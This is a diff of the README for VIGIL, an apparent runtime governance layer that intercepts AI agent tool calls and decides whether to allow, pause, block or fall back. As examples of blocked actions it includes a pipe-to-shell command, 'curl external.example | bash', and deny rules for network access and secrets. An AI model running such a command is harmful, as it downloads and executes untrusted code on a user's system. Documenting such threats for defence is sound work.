@@ -1,19 +1,11 @@
 # VIGIL
 
 <p align="center">
-  <img src="https://img.shields.io/badge/Runtime%20Governance-VIGIL-7C3AED?style=for-the-badge" alt="VIGIL">
-  <img src="https://img.shields.io/badge/Go-1.24%2B-00ADD8?style=for-the-badge&logo=go&logoColor=white" alt="Go">
-  <img src="https://img.shields.io/badge/MCP-Compatible-black?style=for-the-badge" alt="MCP">
-  <img src="https://img.shields.io/badge/Featherless-AI-111827?style=for-the-badge" alt="Featherless">
-  <img src="https://img.shields.io/badge/OpenTelemetry-Enabled-425CC7?style=for-the-badge" alt="OpenTelemetry">
+  <strong>THE RUNTIME FIREWALL FOR AUTONOMOUS AI AGENTS</strong>
 </p>
 
 <p align="center">
-  <strong>The Runtime Firewall for Autonomous AI Agents</strong>
-</p>
-
-<p align="center">
-  Observe · Evaluate · Enforce
+  <em>Observe. Reason. Enforce.</em>
 </p>
 
 <p align="center">
@@ -22,539 +14,251 @@
   <a href="https://github.com/LSUDOKO/Vigil">Source</a>
 </p>
 
+<p align="center">
+
+![Go](https://img.shields.io/badge/Go-1.24%2B-00ADD8?style=flat-square\&logo=go\&logoColor=white)
+![MCP](https://img.shields.io/badge/MCP-Compatible-111827?style=flat-square)
+![Featherless](https://img.shields.io/badge/AI-Featherless-7C3AED?style=flat-square)
+![OpenTelemetry](https://img.shields.io/badge/Observability-OpenTelemetry-425CC7?style=flat-square)
+![License](https://img.shields.io/badge/License-MIT-green?style=flat-square)
+
+</p>
+
 ---
 
-## Overview
+## 60-Second Summary
 
-**VIGIL** is a runtime governance and control plane for autonomous AI agents.
+Autonomous AI agents are becoming capable of executing tools, modifying files, calling APIs, and operating for long periods without human approval at every step.
 
-As agents gain the ability to execute tools, access files, call APIs, run commands, and operate for extended periods, the security boundary moves from the model itself to the **runtime**.
+That creates a new infrastructure problem:
 
-VIGIL sits between the agent and the capabilities it can invoke.
+> **Who controls what an autonomous agent is allowed to do at runtime?**
 
-Every governed action can be evaluated against:
+**VIGIL** is a runtime governance control plane that sits between an AI agent and its tools.
 
-* **Intent** — Is the action consistent with the agent's declared objective?
-* **Policy** — Is the requested capability permitted?
-* **Cost** — Is the session within its configured economic boundary?
-* **Behavior** — Is the agent behaving within its expected baseline?
-* **Security** — Does the action introduce elevated risk?
+It evaluates every governed action across:
 
-VIGIL can then take an explicit runtime action:
+**Intent · Policy · Cost · Behavior · Security**
+
+and makes a runtime decision:
 
 **ALLOW · PAUSE · BLOCK · FALLBACK**
 
-For deterministic cases, VIGIL relies on local runtime controls and policy rules. For ambiguous cases, it can escalate to specialized models through **Featherless**.
+When deterministic rules cannot confidently resolve an action, VIGIL escalates the decision to specialized models through **Featherless**.
 
-> **Agents can act. VIGIL decides whether they should.**
+### The key idea
+
+> **Featherless provides the intelligence layer. VIGIL turns model diversity into runtime control.**
 
 ---
 
-# The Problem
+# Why This Exists
 
-AI agents are no longer limited to generating text.
+AI agents are moving from generating answers to **taking actions**.
 
-They can now:
+An agent can now:
 
 * read and modify files;
 * execute commands;
-* search repositories;
-* call external APIs;
-* access MCP tools;
-* interact with development environments;
+* access repositories;
+* call APIs;
+* use MCP tools;
 * perform long-running workflows;
-* chain multiple tool calls without a human reviewing every step.
+* repeatedly call tools without human intervention.
 
-That changes the risk model.
+The failure mode is no longer only:
 
-A conventional application usually has a human explicitly initiating a sensitive action.
+> “The model generated a wrong answer.”
 
-An autonomous agent can generate a sequence of actions on its own.
+It is increasingly:
 
-The resulting failure modes are different:
+> **“The model generated a sequence of actions that should never have executed.”**
+
+Examples:
 
 ```text
-Agent
-  │
-  ├── unexpected tool call
-  ├── infinite tool loop
-  ├── retry storm
-  ├── budget runaway
-  ├── policy violation
-  ├── unexpected network access
-  ├── unsafe command execution
-  └── behavioral drift
+Infinite tool loop
+        ↓
+Runaway inference
+        ↓
+Budget exhaustion
+        ↓
+Unexpected shell execution
+        ↓
+Unauthorized network access
+        ↓
+Policy violation
+        ↓
+Sensitive-data exposure
+        ↓
+Agent continues operating anyway
 ```
 
-Traditional observability can tell you what happened.
+Traditional observability tells teams what happened.
 
-Static policy can tell you what is allowed.
+Static policy tells teams what should be allowed.
 
-But autonomous systems also require something else:
-
-> **A control layer capable of evaluating the next action before it executes.**
+**Autonomous systems need a runtime layer that decides what happens next.**
 
 ---
 
-# The VIGIL Thesis
+# Why Now
 
-The next generation of agent infrastructure needs an enforceable boundary between:
+The agent ecosystem is moving quickly toward persistent, autonomous execution.
 
-> **what an agent wants to do**
+Featherless itself has publicly identified problems around long-running agents, token/cost anxiety, shell and network access, sandboxing, persistence, and operational security. It is also building managed agent infrastructure around open models.
 
-and
+At the same time, Featherless currently exposes **43k+ open models**, including current families such as **Kimi-K3, GLM-5.2, and DeepSeek-V4**.
 
-> **what the agent is allowed to execute.**
+This creates a new opportunity:
 
-VIGIL makes that boundary explicit.
+> **Instead of using one model for everything, use the right model for the right governance decision.**
 
-```mermaid
-flowchart TD
-    A[Autonomous AI Agent]
-        --> B[MCP / Tool Gateway]
-
-    B --> C[VIGIL Runtime Control Plane]
-
-    C --> D[Intent]
-    C --> E[Policy]
-    C --> F[Cost]
-    C --> G[Behavior]
-    C --> H[Security]
-
-    D --> I[Decision Engine]
-    E --> I
-    F --> I
-    G --> I
-    H --> I
-
-    I --> J{Decision}
-
-    J -->|Safe| K[ALLOW]
-    J -->|Recoverable| L[FALLBACK]
-    J -->|Requires Review| M[PAUSE]
-    J -->|Unsafe| N[BLOCK]
-
-    K --> O[Protected Tool]
-    L --> O
-```
-
-VIGIL does not replace the agent.
-
-It governs the **execution boundary around the agent**.
+That is the architectural foundation of VIGIL.
 
 ---
 
-# Why Now?
+# The Solution
 
-Three infrastructure shifts are happening simultaneously.
+VIGIL creates an enforceable boundary between:
 
-## 1. Agents are becoming operational
+```text
+WHAT THE AGENT WANTS TO DO
+              │
+              ▼
+       ┌─────────────┐
+       │    VIGIL    │
+       │  GOVERNANCE │
+       └──────┬──────┘
+              │
+              ▼
+WHAT THE AGENT IS ALLOWED TO DO
+```
 
-Agents increasingly execute real actions instead of merely answering questions.
+Every governed action can be evaluated against:
 
-## 2. Tool access is expanding
+| Signal       | Question                                                       |
+| ------------ | -------------------------------------------------------------- |
+| **Intent**   | Is this action consistent with the agent's declared objective? |
+| **Policy**   | Is this tool/capability explicitly permitted?                  |
+| **Cost**     | Is the session within its economic boundary?                   |
+| **Behavior** | Has the agent deviated from its normal execution pattern?      |
+| **Security** | Does the action present elevated runtime risk?                 |
 
-Protocols such as MCP make it easier for agents to interact with files, APIs, repositories, shells, and external systems.
+The output is explicit:
 
-## 3. Model ecosystems are becoming heterogeneous
-
-Developers no longer have to rely on one model provider or one model family.
-
-Featherless currently exposes **43k+ open models**, making model specialization and routing an increasingly practical design pattern.
-
-That creates a new infrastructure question:
-
-> **Who governs the runtime behavior of an agent when the agent itself becomes the execution layer?**
-
-VIGIL is built around that problem.
+```text
+ALLOW
+PAUSE
+BLOCK
+FALLBACK
+```
 
 ---
 
-# What VIGIL Does
+# The Featherless Advantage
 
-## 1. Intent-Aware Governance
+## VIGIL is not simply "an app that calls an LLM."
 
-An operator can declare what an agent is supposed to accomplish.
+Featherless is part of the runtime decision architecture.
 
-Example:
+The current Featherless catalog contains **43k+ models**, making specialization and model routing practical at the infrastructure layer.
 
-```text
-Fix the failing tests in this repository.
+VIGIL uses that model diversity for **governance**.
 
-Allowed:
-- read project files
-- search code
-- modify project files
-- run tests
+### Example
 
-Denied:
-- network access
-- secrets
-- arbitrary shell execution
-
-Maximum budget:
-$2
-```
-
-VIGIL turns that intent into structured runtime policy.
-
-A compliant action:
+A simple tool call:
 
 ```text
-run_tests
+read_file
       ↓
-policy evaluation
+deterministic checks
       ↓
 ALLOW
 ```
 
-A conflicting action:
+An ambiguous action:
 
 ```text
-network request
+unknown shell command
       ↓
-intent / policy evaluation
+Featherless fast risk model
+      ↓
+UNCERTAIN
+      ↓
+Featherless reasoning model
+      ↓
+HIGH RISK
       ↓
 BLOCK
 ```
 
-The distinction is fundamental:
+A high-risk event can be escalated further:
 
-> **Task intent is not the same thing as tool permission.**
+```text
+Threat detected
+      ↓
+Reasoning model
+      ↓
+Security critic
+      ↓
+Decision validator
+      ↓
+BLOCK / PAUSE
+```
+
+### The result
+
+> **Model abundance becomes a runtime security primitive.**
 
 ---
 
-# 2. Runtime Tool Interception
-
-VIGIL provides a governance boundary around tool execution.
-
-Depending on the integration, this can cover:
-
-* MCP tools
-* file operations
-* shell execution
-* code search
-* repository analysis
-* external APIs
-* custom agent actions
-
-The governance layer is placed on the runtime path:
-
-```text
-Agent
-  ↓
-VIGIL
-  ↓
-Governance Decision
-  ↓
-Tool
-```
-
-Rather than:
-
-```text
-Agent
-  ↓
-Tool
-  ↓
-Log what happened later
-```
-
----
-
-# 3. Predictive Cost Governance
-
-VIGIL does more than report historical cost.
-
-It tracks runtime economics to estimate where a session is heading.
-
-Signals include:
-
-* current spend;
-* spend velocity;
-* recent usage;
-* budget utilization;
-* projected cost;
-* estimated time to budget exhaustion;
-* soft limits;
-* hard limits.
-
-Example:
-
-```text
-SESSION
-────────────────────────────
-
-Current Spend       $0.78
-Budget              $2.00
-Burn Rate           $0.21/min
-Projected Spend     $2.71
-Estimated Breach    05:42
-```
-
-Possible responses:
-
-```text
-WARNING
-   ↓
-FALLBACK
-   ↓
-PAUSE
-   ↓
-HARD STOP
-```
-
-This transforms cost from a billing metric into a runtime governance signal.
-
----
-
-# 4. Adaptive Multi-Model Governance
-
-Not every runtime decision requires the same reasoning capacity.
-
-VIGIL therefore supports tiered model evaluation.
+# Featherless-Powered Adaptive Inference
 
 ```mermaid
 flowchart TD
-    A[Tool Event]
-        --> B[Deterministic Checks]
 
-    B -->|Clearly Safe| C[ALLOW]
+    A[Agent Tool Request]
+        --> B[VIGIL Interceptor]
 
-    B -->|Clearly Unsafe| D[BLOCK]
+    B --> C{Deterministic Risk}
 
-    B -->|Uncertain| E[Featherless Model Router]
+    C -->|Clearly Safe| D[ALLOW]
+    C -->|Clearly Unsafe| E[BLOCK]
+    C -->|Uncertain| F[Featherless Router]
 
-    E --> F[Fast Risk Model]
-    E --> G[Reasoning Model]
-    E --> H[Security Critic]
+    F --> G[Fast Risk Model]
+    F --> H[Reasoning Model]
+    F --> I[Security Critic]
 
-    F --> I[Validated Decision]
-    G --> I
-    H --> I
+    G --> J[Structured Decision]
+    H --> J
+    I --> J
 
-    I --> J{Final Action}
+    J --> K{Validated Outcome}
 
-    J --> C
-    J --> K[PAUSE]
-    J --> D
-    J --> L[FALLBACK]
+    K -->|ALLOW| D
+    K -->|PAUSE| L[PAUSE]
+    K -->|BLOCK| E
+    K -->|RECOVER| M[FALLBACK]
 ```
 
-This allows the runtime to optimize across:
+### Why this matters
 
-**security · latency · cost · reasoning depth**
+The system does not blindly invoke an expensive model for every tool call.
 
-The goal is not to invoke an expensive model for every event.
+Instead:
 
-The goal is to invoke **the right model at the right point in the decision pipeline**.
+**Deterministic first → semantic reasoning when necessary → deeper review only when justified.**
+
+That provides a deliberate tradeoff between:
+
+**security · latency · inference cost · reasoning quality**
 
 ---
 
-# 5. AI-Assisted Risk Evaluation
-
-When deterministic rules cannot confidently resolve an event, VIGIL can send structured runtime context to a Featherless-hosted model.
-
-Typical context includes:
-
-* agent intent;
-* active policy;
-* requested tool;
-* tool arguments;
-* recent tool history;
-* current cost state;
-* detected runtime signals.
-
-The model is expected to return structured data:
-
-```json
-{
-  "risk_score": 94,
-  "severity": "HIGH",
-  "decision": "BLOCK",
-  "intent_violation": true,
-  "confidence": 0.96,
-  "reasons": [
-    "Action is outside declared task scope",
-    "External execution path detected"
-  ]
-}
-```
-
-The response must be schema-validated before being used by the runtime.
-
-### Important design principle
-
-> **The model recommends. VIGIL enforces.**
-
-AI output does not automatically override deterministic security boundaries.
-
----
-
-# 6. Natural-Language Policy Generation
-
-VIGIL can expose policy creation as a natural-language interface.
-
-Example:
-
-```text
-Allow repository reads and test execution.
-Block network access and secrets.
-Limit the session to $2.
-Pause unknown shell commands.
-```
-
-The generated policy can be normalized into a structured representation:
-
-```yaml
-budget:
-  soft_limit: 1.60
-  hard_limit: 2.00
-
-tools:
-  read_file: allow
-  search_code: allow
-  run_tests: allow
-  network: deny
-  secrets: deny
-  unknown_shell: pause
-```
-
-The generated policy is then:
-
-1. schema validated;
-2. normalized;
-3. checked for unsafe configuration;
-4. shown for confirmation;
-5. compiled into the runtime engine.
-
-The model creates a policy proposal.
-
-It does **not** receive unrestricted authority over the policy engine.
-
----
-
-# 7. Behavioral Threat Detection
-
-VIGIL can track behavioral characteristics of agent sessions.
-
-Examples include:
-
-* unusual tool frequency;
-* repeated operations;
-* retry storms;
-* unexpected tool transitions;
-* latency anomalies;
-* accelerating cost;
-* intent violations;
-* behavioral drift.
-
-Example:
-
-```text
-EXPECTED
-
-read_file
-search_code
-run_tests
-
-                 ↓
-
-OBSERVED
-
-search_code × 19
-run_command × 8
-network request × 3
-
-                 ↓
-
-VIGIL
-
-Behavioral Drift     HIGH
-Intent Violation     YES
-Projected Cost       ABOVE LIMIT
-
-Action                PAUSE
-```
-
-This is important because a dangerous agent is not always identified by one obviously malicious request.
-
-Sometimes the signal is:
-
-> **the agent's behavior changed.**
-
----
-
-# 8. Recovery and Fallback
-
-Runtime governance should not automatically terminate every abnormal session.
-
-Where a safe recovery exists, VIGIL can apply it.
-
-```mermaid
-flowchart TD
-    A[Runtime Event]
-        --> B{Failure / Risk Type}
-
-    B -->|Transient Model Failure| C[Fallback Model]
-    B -->|Rising Inference Cost| D[Lower-Cost Route]
-    B -->|Tool Timeout| E[Circuit Breaker]
-    B -->|Intent Violation| F[BLOCK]
-    B -->|High Risk| G[PAUSE]
-
-    C --> H[Continue Safely]
-    D --> H
-    E --> H
-
-    F --> I[Audit]
-    G --> I
-```
-
-The design principle is:
-
-> **Preserve useful autonomy without surrendering runtime control.**
-
----
-
-# 9. Tamper-Evident Audit Trail
-
-Every governed action can be represented as an audit event containing information such as:
-
-```text
-timestamp
-session ID
-agent ID
-tool
-decision
-policy
-risk
-model
-cost
-reason
-trace ID
-previous hash
-current hash
-```
-
-Events can be chained using cryptographic hashes:
-
-```mermaid
-flowchart LR
-    A[Event 1]
-      --> B[Hash 1]
-
-    B --> C[Event 2 + Hash 1]
-    C --> D[Hash 2]
-
-    D --> E[Event 3 + Hash 2]
-    E --> F[Hash 3]
-```
-
-This provides a **tamper-evident** execution history for debugging, investigation, and governance evidence.
-
----
-
-# End-to-End Architecture
+# Core Runtime Architecture
 
 ```mermaid
 flowchart TB
@@ -577,17 +281,17 @@ flowchart TB
     G --> I
     H --> I
 
-    I --> J{Risk / Confidence}
+    I --> J{Decision State}
 
-    J -->|Low Risk| K[ALLOW]
-    J -->|Policy Violation| L[BLOCK]
-    J -->|Requires Review| M[PAUSE]
+    J -->|Safe| K[ALLOW]
+    J -->|Unsafe| L[BLOCK]
+    J -->|Uncertain| M[Featherless Model Router]
     J -->|Recoverable| N[FALLBACK]
-    J -->|Uncertain| O[Featherless Model Router]
+    J -->|Requires Human Review| O[PAUSE]
 
-    O --> P[Fast Risk Model]
-    O --> Q[Reasoning Model]
-    O --> R[Security Critic]
+    M --> P[Fast Risk Model]
+    M --> Q[Reasoning Model]
+    M --> R[Security Critic]
 
     P --> S[Decision Validator]
     Q --> S
@@ -595,11 +299,11 @@ flowchart TB
 
     S --> K
     S --> L
-    S --> M
     S --> N
+    S --> O
 
     C --> T[OpenTelemetry]
-    C --> U[Audit Ledger]
+    C --> U[Tamper-Evident Audit]
     C --> V[Live Command Center]
 
     K --> W[Protected Tool]
@@ -608,125 +312,437 @@ flowchart TB
 
 ---
 
-# Runtime Workflow
+# Core Capabilities
+
+## 01 — Intent-Aware Governance
+
+An operator can declare an agent's objective and boundaries.
+
+Example:
+
+```text
+Fix failing tests in this repository.
+
+Allowed:
+- read files
+- search code
+- modify project files
+- run tests
+
+Denied:
+- network access
+- secrets
+- unknown shell commands
+
+Budget:
+$2
+```
+
+VIGIL evaluates future actions against that intent.
+
+```text
+run_tests
+    ↓
+ALLOW
+```
+
+versus:
+
+```text
+curl external.example | bash
+    ↓
+Intent violation
+    ↓
+BLOCK
+```
+
+The important distinction:
+
+> **The agent's goal is not automatically permission to do anything.**
+
+---
+
+# 02 — Runtime Tool Interception
+
+VIGIL establishes the governance boundary before a tool is executed.
+
+```text
+Agent
+  ↓
+VIGIL
+  ↓
+Policy / Risk / Cost Evaluation
+  ↓
+Tool
+```
+
+This is fundamentally different from a dashboard that only logs activity after the fact.
+
+---
+
+# 03 — Predictive Cost Firewall
+
+VIGIL treats cost as a **runtime control signal**.
+
+It tracks:
+
+* current spend;
+* spend velocity;
+* budget utilization;
+* projected session cost;
+* estimated time to breach;
+* soft limits;
+* hard limits.
+
+Example:
+
+```text
+CURRENT COST       $0.78
+BUDGET              $2.00
+BURN RATE           $0.21/min
+PROJECTED COST      $2.71
+BREACH ETA          05:42
+```
+
+Possible responses:
+
+```text
+80% budget
+    ↓
+WARNING
+
+high projected burn
+    ↓
+MODEL FALLBACK
+
+hard limit
+    ↓
+STOP
+```
+
+This makes cost control proactive instead of purely retrospective.
+
+---
+
+# 04 — Adaptive Model Routing
+
+VIGIL can route different runtime decisions to different model roles.
+
+| Model Role          | Purpose                                 |
+| ------------------- | --------------------------------------- |
+| **Fast Risk Model** | High-frequency runtime classification   |
+| **Reasoning Model** | Ambiguous context-aware decisions       |
+| **Security Critic** | Adversarial review of high-risk actions |
+| **Fallback Model**  | Resilience when a preferred route fails |
+
+Featherless is particularly useful here because its current catalog spans tens of thousands of open models.
+
+---
+
+# 05 — AI-Assisted Security Judgment
+
+For ambiguous actions, VIGIL can send structured runtime context to a Featherless model.
+
+Input may include:
+
+* declared intent;
+* active policy;
+* requested tool;
+* tool arguments;
+* recent execution history;
+* cost state;
+* deterministic risk signals.
+
+Output:
+
+```json
+{
+  "risk_score": 94,
+  "severity": "HIGH",
+  "decision": "BLOCK",
+  "intent_violation": true,
+  "confidence": 0.96,
+  "reasons": [
+    "Action exceeds declared task scope",
+    "External execution path detected"
+  ]
+}
+```
+
+The response is schema-validated before it can affect runtime enforcement.
+
+### Principle
+
+> **The model recommends. VIGIL enforces.**
+
+---
+
+# 06 — Natural Language → Runtime Policy
+
+Operators should not need to hand-author every policy.
+
+Example:
+
+```text
+Allow repository reads and test execution.
+Block network access and secrets.
+Limit the session to $2.
+Pause unknown shell commands.
+```
+
+VIGIL converts the instruction into a structured policy:
+
+```yaml
+budget:
+  soft_limit: 1.60
+  hard_limit: 2.00
+
+tools:
+  read_file: allow
+  search_code: allow
+  run_tests: allow
+  network: deny
+  secrets: deny
+  unknown_shell: pause
+```
+
+Before activation:
+
+```text
+Generate
+   ↓
+Schema Validate
+   ↓
+Normalize
+   ↓
+Safety Check
+   ↓
+Human Confirmation
+   ↓
+Activate
+```
+
+---
+
+# 07 — Behavioral Threat Radar
+
+A dangerous execution pattern may not be obvious from one tool call.
+
+VIGIL can track behavioral signals such as:
+
+* repeated tool calls;
+* retry storms;
+* unexpected tool transitions;
+* latency spikes;
+* cost acceleration;
+* policy violations;
+* session drift.
+
+Example:
+
+```text
+NORMAL
+
+read_file
+search_code
+run_tests
+
+        ↓
+
+ABNORMAL
+
+search_code × 19
+run_command × 8
+network × 3
+
+        ↓
+
+VIGIL
+
+Behavioral Drift: HIGH
+Intent Violation: YES
+Projected Cost: ABOVE LIMIT
+
+ACTION: PAUSE
+```
+
+---
+
+# 08 — Recovery and Fallback
+
+Governance should not always mean termination.
+
+When a safe recovery exists, VIGIL can use it.
+
+```mermaid
+flowchart TD
+
+    A[Runtime Event] --> B{Condition}
+
+    B -->|Model Failure| C[Fallback Model]
+    B -->|Cost Escalation| D[Lower-Cost Route]
+    B -->|Tool Timeout| E[Circuit Breaker]
+    B -->|Intent Violation| F[BLOCK]
+    B -->|High Risk| G[PAUSE]
+
+    C --> H[Continue]
+    D --> H
+    E --> H
+
+    F --> I[Audit]
+    G --> I
+```
+
+The objective:
+
+> **Keep useful autonomy alive without allowing the agent to escape its boundaries.**
+
+---
+
+# 09 — Tamper-Evident Audit Trail
+
+VIGIL records governance decisions as structured events.
+
+A record can include:
+
+```text
+timestamp
+session
+agent
+tool
+decision
+policy
+risk
+model
+cost
+reason
+trace ID
+previous hash
+current hash
+```
+
+```mermaid
+flowchart LR
+
+    A[Event 1] --> B[Hash 1]
+    B --> C[Event 2 + Hash 1]
+    C --> D[Hash 2]
+    D --> E[Event 3 + Hash 2]
+    E --> F[Hash 3]
+```
+
+This gives operators a verifiable history of runtime governance decisions.
+
+---
+
+# Complete Runtime Workflow
 
 ```mermaid
 sequenceDiagram
 
-    participant A as Agent
-    participant V as VIGIL
-    participant P as Policy
-    participant C as Cost
-    participant R as Risk Engine
-    participant F as Featherless
-    participant T as Tool
-    participant O as OpenTelemetry
+    participant Agent
+    participant VIGIL
+    participant Policy
+    participant Cost
+    participant Risk
+    participant Featherless
+    participant Tool
+    participant Telemetry
 
-    A->>V: Tool Request
+    Agent->>VIGIL: Tool Request
 
-    V->>P: Evaluate Intent + Policy
-    P-->>V: Policy Result
+    VIGIL->>Policy: Intent + Policy Check
+    Policy-->>VIGIL: Result
 
-    V->>C: Evaluate Budget + Forecast
-    C-->>V: Cost State
+    VIGIL->>Cost: Budget + Forecast
+    Cost-->>VIGIL: Cost State
 
-    V->>R: Evaluate Behavior
-    R-->>V: Runtime Risk
+    VIGIL->>Risk: Behavioral Evaluation
+    Risk-->>VIGIL: Runtime Risk
 
-    alt Deterministically safe
-        V->>T: Execute
-        T-->>V: Result
-        V->>O: Emit Trace
-        V-->>A: Tool Result
+    alt Safe
+        VIGIL->>Tool: Execute
+        Tool-->>VIGIL: Result
+        VIGIL->>Telemetry: Record
+        VIGIL-->>Agent: Result
 
     else Uncertain / Elevated Risk
-        V->>F: Semantic Risk Evaluation
-        F-->>V: Structured Decision
+        VIGIL->>Featherless: Semantic Risk Analysis
+        Featherless-->>VIGIL: Structured Decision
 
-        alt Allowed
-            V->>T: Execute
-            T-->>V: Result
-            V-->>A: Result
+        alt Allow
+            VIGIL->>Tool: Execute
+            Tool-->>VIGIL: Result
+            VIGIL-->>Agent: Result
 
-        else Blocked
-            V-->>A: Action Denied
+        else Block
+            VIGIL-->>Agent: Action Denied
 
-        else Paused
-            V-->>A: Review Required
+        else Pause
+            VIGIL-->>Agent: Review Required
         end
 
-        V->>O: Emit Governance Trace
+        VIGIL->>Telemetry: Record Governance Decision
     end
 ```
 
 ---
 
-# Why Featherless?
+# What Makes VIGIL Different?
 
-VIGIL is designed to make model diversity operationally useful.
+| Traditional approach     | VIGIL                                 |
+| ------------------------ | ------------------------------------- |
+| Observe execution        | **Govern execution**                  |
+| Log failures             | **Intervene before execution**        |
+| Static rules             | **Intent + behavior + cost + policy** |
+| One model                | **Adaptive model routing**            |
+| Post-hoc billing         | **Predictive cost governance**        |
+| Block everything risky   | **Allow / Pause / Block / Fallback**  |
+| Model makes the decision | **Model recommends, VIGIL enforces**  |
 
-Featherless provides a large catalog of open models behind a unified inference interface. VIGIL can use that model diversity for different runtime decisions instead of forcing one model to perform every task.
+---
 
-Potential roles:
+# Why Featherless Is Central to VIGIL
 
-| Role            | Purpose                                 |
-| --------------- | --------------------------------------- |
-| Fast Risk Model | High-frequency classification           |
-| Reasoning Model | Context-heavy policy/risk analysis      |
-| Security Critic | Adversarial review                      |
-| Fallback Model  | Resilience when a preferred model fails |
+This project was intentionally designed around a problem that becomes more interesting as the model ecosystem gets larger.
 
-The architectural idea is:
+Featherless's current catalog exposes **43k+ models**, including Kimi-K3, GLM-5.2, DeepSeek-V4 and many other open model families.
+
+VIGIL turns that diversity into a runtime capability:
 
 ```text
-Model abundance
-      ↓
-Task specialization
-      ↓
-Adaptive routing
-      ↓
-Runtime governance
+30k+ Models
+     ↓
+Specialized Governance Roles
+     ↓
+Adaptive Routing
+     ↓
+Context-Aware Risk Evaluation
+     ↓
+Runtime Enforcement
 ```
 
----
+This is why Featherless is not just a sponsor integration.
 
-# Why VIGIL Is Different
+**It is part of VIGIL's architecture.**
 
-### Traditional observability
-
-**See what happened.**
-
-### Static policy
-
-**Define what should be allowed.**
-
-### AI security
-
-**Classify potentially dangerous behavior.**
-
-### VIGIL
-
-**Evaluate the action and control what happens next.**
-
-The distinction is runtime enforcement.
+Featherless is also explicitly building around open-model agent runtimes and operational trust, making runtime governance a natural adjacent problem.
 
 ---
 
-# Useful For
+# Real-World Use Cases
 
 ## Autonomous Coding Agents
 
 Govern agents that:
 
-* modify repositories;
+* edit code;
 * execute tests;
-* access shells;
-* interact with external services;
-* operate for extended periods.
+* use shell commands;
+* interact with repositories;
+* make external requests.
 
-## MCP Workflows
-
-Introduce a governance boundary between:
+## MCP Environments
 
 ```text
 MCP Client
@@ -736,53 +752,55 @@ VIGIL
 MCP Tools
 ```
 
-## Internal AI Platforms
+## Internal Agent Platforms
 
-Provide:
+Provide centralized:
 
-* runtime budgets;
-* agent policies;
+* policies;
+* budgets;
 * intervention;
-* behavioral monitoring;
-* audit trails.
+* monitoring;
+* auditability.
 
-## Agentic Automation
+## Long-Running Automation
 
-Govern long-running workflows that:
-
-* call multiple tools;
-* access external APIs;
-* consume inference;
-* execute actions automatically.
+Protect workflows that operate without continuous human supervision.
 
 ---
 
-# Product Positioning
+# Target Users
 
-VIGIL is designed as an **infrastructure product**, not another consumer-facing AI assistant.
+### Developers
 
-The initial wedge is:
+Running autonomous coding agents.
 
-> **runtime governance for autonomous developer and agent workflows.**
+### Platform Engineers
 
-Potential users include:
+Operating internal agent infrastructure.
 
-* AI infrastructure teams;
-* platform engineering teams;
-* developer-tool companies;
-* teams operating coding agents;
-* MCP ecosystem developers;
-* organizations deploying autonomous workflows.
+### AI Infrastructure Teams
+
+Building and governing agent runtimes.
+
+### Agent Framework Builders
+
+Adding runtime enforcement to autonomous systems.
+
+### Organizations Deploying Agents
+
+Needing cost, policy, security and observability controls.
 
 ---
 
-# Market Evolution
+# Product Direction
+
+VIGIL starts with runtime enforcement and can evolve into a broader agent governance platform.
 
 ```mermaid
 flowchart LR
 
-    A[Runtime Agent Firewall]
-      --> B[MCP Governance]
+    A[Runtime Firewall]
+        --> B[MCP Governance]
 
     B --> C[Team Control Plane]
 
@@ -793,230 +811,86 @@ flowchart LR
     E --> F[Autonomous AI Infrastructure]
 ```
 
-## Phase 1 — Runtime Protection
+### Phase 1 — Runtime Protection
 
 * tool interception;
-* policy enforcement;
-* cost control;
-* behavior monitoring;
-* runtime intervention.
+* policy;
+* budgets;
+* risk;
+* enforcement.
 
-## Phase 2 — Team Governance
+### Phase 2 — Team Governance
 
 * persistent policies;
-* organizations;
 * RBAC;
-* incident workflows;
-* shared dashboards.
+* organizations;
+* incident workflows.
 
-## Phase 3 — Enterprise Control
+### Phase 3 — Enterprise Control
 
 * identity integrations;
 * fleet management;
 * centralized policy;
-* audit retention;
-* governance workflows.
+* audit retention.
 
-## Phase 4 — Agent Infrastructure
+### Phase 4 — Agent Infrastructure
 
 * lifecycle management;
-* model routing;
-* adaptive security;
-* cost optimization;
-* multi-agent orchestration.
-
----
-
-# Production Readiness
-
-VIGIL is designed with a production-oriented architecture, but the current project should not be interpreted as a security certification or compliance certification.
-
-A hardened production deployment would additionally require:
-
-* sandbox isolation;
-* stronger identity controls;
-* persistent policy storage;
-* tenant isolation;
-* secrets management;
-* network controls;
-* resource quotas;
-* threat-model-specific security testing;
-* production incident response;
-* formal compliance processes where applicable.
-
-The architecture is intentionally modular so those capabilities can be introduced without replacing the runtime governance core.
-
----
-
-# Security Principles
-
-## Deterministic First
-
-Use deterministic checks wherever they are sufficient.
-
-## AI Where Reasoning Adds Value
-
-Use model inference for semantic ambiguity instead of trivial authorization.
-
-## Fail Closed
-
-Critical governance failures should not silently produce unrestricted execution.
-
-## Least Privilege
-
-Give agents only the capabilities required for their task.
-
-## Human Override
-
-Operators must be able to pause or terminate execution.
-
-## Explicit Uncertainty
-
-Model confidence is not authorization.
-
-## Traceability
-
-Important runtime decisions should be reconstructable.
-
-## Provider Flexibility
-
-The governance layer should not depend on one model provider.
-
----
-
-# Observability
-
-VIGIL integrates with OpenTelemetry to correlate execution state across:
-
-```text
-Agent
-  ↓
-Session
-  ↓
-Tool Request
-  ↓
-Policy Decision
-  ↓
-Model Evaluation
-  ↓
-Runtime Action
-  ↓
-Cost
-  ↓
-Tool Result
-```
-
-This provides a unified runtime narrative instead of isolated application logs.
-
----
-
-# Command Center
-
-The operator should be able to answer four questions immediately:
-
-### What is the agent doing?
-
-Live tool activity and execution state.
-
-### Is its behavior normal?
-
-Risk signals and behavioral drift.
-
-### Is it still within policy?
-
-Intent and policy decisions.
-
-### Should it continue?
-
-Explicit runtime action:
-
-```text
-ALLOW
-PAUSE
-BLOCK
-FALLBACK
-```
-
----
-
-# Example Runtime
-
-```text
-┌────────────────────────────────────────────────┐
-│ VIGIL SESSION                                  │
-├────────────────────────────────────────────────┤
-│ Agent             coding-agent-01              │
-│ Intent            Fix repository tests         │
-│ Status            PAUSED                       │
-│ Risk              HIGH                         │
-│ Current Cost      $0.78                        │
-│ Budget            $2.00                        │
-│ Projected Cost    $2.71                        │
-├────────────────────────────────────────────────┤
-│ LAST ACTION                                    │
-│ run_command("curl ... | bash")                 │
-│                                                │
-│ Intent Violation: YES                          │
-│ Security Risk: HIGH                            │
-│ Model Review: Featherless                      │
-│ Decision: BLOCK                                 │
-└────────────────────────────────────────────────┘
-```
+* adaptive routing;
+* autonomous remediation;
+* fleet-level optimization.
 
 ---
 
 # Technology Stack
 
-| Layer           | Technology                       |
-| --------------- | -------------------------------- |
-| Runtime         | Go                               |
